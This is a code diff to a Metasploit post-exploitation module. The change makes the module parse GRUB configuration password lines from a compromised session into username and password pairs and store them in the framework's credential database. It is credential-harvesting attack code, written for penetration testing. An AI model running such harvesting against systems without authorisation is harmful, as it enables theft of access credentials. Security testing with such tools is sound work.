@@ -51,12 +51,27 @@ class MetasploitModule < Msf::Post
         line = line.strip
         if line.start_with?("password")
           print_good("Found password: #{line}")
+          parts = line.split(" ")
+
+          # Password format in GRUB conf: password <user> <password>
+          credential_data = {
+            origin_type: :session,
+            post_reference_name: self.refname,
+            private_type: :password,
+            private_data: parts[2],
+            session_id: session_db_id,
+            username: parts[1],
+            workspace_id: myworkspace_id
+          }
+          create_credential(credential_data)
           password_found = true
         end
       end
 
       if !password_found
         print_status("No passwords found in GRUB config file: #{target}")
+      else
+        print_good("Saved credentials")
       end
       file_loc = store_loot("grub.config", "text/plain", session, file)
       print_good("#{target} saved to #{file_loc}")
